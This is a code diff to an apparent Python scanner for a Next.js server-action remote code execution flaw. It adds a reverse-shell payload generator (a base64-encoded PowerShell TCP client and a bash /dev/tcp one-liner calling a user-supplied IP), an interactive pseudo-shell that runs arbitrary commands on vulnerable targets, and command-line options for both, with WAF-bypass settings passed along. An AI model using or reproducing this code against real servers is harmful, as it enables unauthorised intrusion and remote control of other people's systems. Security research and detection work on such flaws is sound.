@@ -445,7 +445,7 @@ def save_results(results: list[dict], output_file: str, vulnerable_only: bool = 
         print(colorize(f"\n[ERROR] Failed to save results: {e}", Colors.RED))
 
 
-def print_result(result: dict, verbose: bool = False):
+def print_result(result: dict, verbose: bool = False, show_response: bool = False):
     host = result["host"]
     final_url = result.get("final_url")
     redirected = final_url and final_url != f"{normalize_host(host)}/"
@@ -474,6 +474,91 @@ def print_result(result: dict, verbose: bool = False):
             lines = result["response"].split("\r\n")[:10]
             for line in lines:
                 print(f"    {line}")
+
+    if show_response:
+        print(colorize("  Full Response:", Colors.CYAN))
+        if result.get("response"):
+            print(result["response"])
+
+
+def generate_reverse_shell(ip: str, port: str, windows: bool = False) -> str:
+    """Generate a reverse shell payload."""
+    if windows:
+        # PowerShell Reverse Shell
+        ps_payload = (
+            f"$client = New-Object System.Net.Sockets.TcpClient('{ip}',{port});"
+            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
+            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
+            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
+            f"$sendback = (iex $data 2>&1 | Out-String );"
+            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+            f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
+            f"$client.Close()"
+        )
+        # Base64 encode to avoid escaping issues
+        ps_bytes = ps_payload.encode('utf-16le')
+        b64_payload = base64.b64encode(ps_bytes).decode()
+        return f"powershell -e {b64_payload}"
+    else:
+        # Linux Reverse Shell (Bash TCP)
+        # We use base64 encoding for the inner command to avoid bad chars in the execSync context
+        inner_cmd = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+        b64_cmd = base64.b64encode(inner_cmd.encode()).decode()
+        return f"echo {b64_cmd} | base64 -d | bash"
+
+
+def interactive_shell(target_url: str, headers: dict, timeout: int, verify_ssl: bool, windows: bool, waf_bypass: bool, waf_bypass_size_kb: int):
+    """Run an interactive pseudo-shell."""
+    print(colorize(f"\n[+] Entering interactive shell on {target_url}", Colors.GREEN))
+    print(colorize("[*] Type 'exit' or 'quit' to leave", Colors.YELLOW))
+
+    # Base headers needed for the request
+    req_headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
+        "Next-Action": "x",
+        "X-Nextjs-Request-Id": "b5dce965",
+        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
+    }
+    if headers:
+        req_headers.update(headers)
+
+    while True:
+        try:
+            cmd = input(colorize("Shell> ", Colors.CYAN)).strip()
+            if cmd.lower() in ["exit", "quit"]:
+                break
+            if not cmd:
+                continue
+
+            # Build payload
+            body, content_type = build_rce_payload(windows=windows, waf_bypass=waf_bypass, waf_bypass_size_kb=waf_bypass_size_kb, command=cmd)
+
+            # Update content type for this request
+            current_headers = req_headers.copy()
+            current_headers["Content-Type"] = content_type
+
+            response, error = send_payload(target_url, current_headers, body, timeout, verify_ssl)
+
+            if error:
+                print(colorize(f"[!] Error: {error}", Colors.RED))
+                continue
+
+            # Check for output
+            output = extract_rce_output(response)
+            if output:
+                print(output)
+            elif response and response.status_code == 500:
+                 # Sometimes 500 implies error in execution but maybe no output captured in header
+                 print(colorize(f"[!] Command executed but no output (Status: 500)", Colors.YELLOW))
+            elif response:
+                 print(colorize(f"[!] No output (Status: {response.status_code})", Colors.YELLOW))
+
+        except KeyboardInterrupt:
+            print()
+            break
+        except Exception as e:
+            print(colorize(f"[!] Error: {e}", Colors.RED))
 
 
 def main():
@@ -588,6 +673,25 @@ Examples:
         help="Custom command to execute (default: 'echo $((41*271))' or 'powershell -c \"41*271\"')"
     )
 
+    parser.add_argument(
+        "-R", "--response",
+        action="store_true",
+        help="Print the full response"
+    )
+
+    parser.add_argument(
+        "--rev",
+        nargs=2,
+        metavar=('IP', 'PORT'),
+        help="Spawn a reverse shell (requires IP and PORT)"
+    )
+
+    parser.add_argument(
+        "--shell",
+        action="store_true",
+        help="Enter interactive pseudo-shell mode (single target only)"
+    )
+
     args = parser.parse_args()
 
     if args.no_color or not sys.stdout.isatty():
@@ -603,6 +707,12 @@ Examples:
 
     if not args.quiet:
         print_banner()
+
+    if args.rev:
+        ip, port = args.rev
+        if not args.quiet:
+            print(colorize(f"[+] Generating Reverse Shell Payload for {ip}:{port}", Colors.GREEN))
+        args.command = generate_reverse_shell(ip, port, args.windows)
 
     if args.url:
         hosts = [args.url]
@@ -648,11 +758,20 @@ Examples:
     if len(hosts) == 1:
         result = check_vulnerability(hosts[0], timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, command=args.command)
         results.append(result)
-        if not args.quiet or result["vulnerable"]:
-            print_result(result, args.verbose)
+        if not args.quiet or result["vulnerable"] or args.response:
+            print_result(result, args.verbose, args.response)
         if result["vulnerable"]:
             vulnerable_count = 1
+            if args.shell:
+                target = result.get("final_url") or result["host"]
+                # Ensure we have a valid URL to post to
+                if not target.startswith("http"):
+                    target = normalize_host(target) + "/"
+                interactive_shell(target, custom_headers, timeout, verify_ssl, args.windows, args.waf_bypass, args.waf_bypass_size)
     else:
+        if args.shell:
+            print(colorize("[!] Interactive shell is only supported for single target (-u)", Colors.YELLOW))
+            sys.exit(1)
         with ThreadPoolExecutor(max_workers=args.threads) as executor:
             futures = {
                 executor.submit(check_vulnerability, host, timeout, verify_ssl, custom_headers=custom_headers, safe_check=args.safe_check, windows=args.windows, waf_bypass=args.waf_bypass, waf_bypass_size_kb=args.waf_bypass_size, command=args.command): host
@@ -673,15 +792,15 @@ Examples:
                     if result["vulnerable"]:
                         vulnerable_count += 1
                         tqdm.write("")
-                        print_result(result, args.verbose)
+                        print_result(result, args.verbose, args.response)
                     elif result["error"]:
                         error_count += 1
-                        if not args.quiet and args.verbose:
+                        if not args.quiet and (args.verbose or args.response):
                             tqdm.write("")
-                            print_result(result, args.verbose)
-                    elif not args.quiet and args.verbose:
+                            print_result(result, args.verbose, args.response)
+                    elif not args.quiet and (args.verbose or args.response):
                         tqdm.write("")
-                        print_result(result, args.verbose)
+                        print_result(result, args.verbose, args.response)
 
                     pbar.update(1)
 
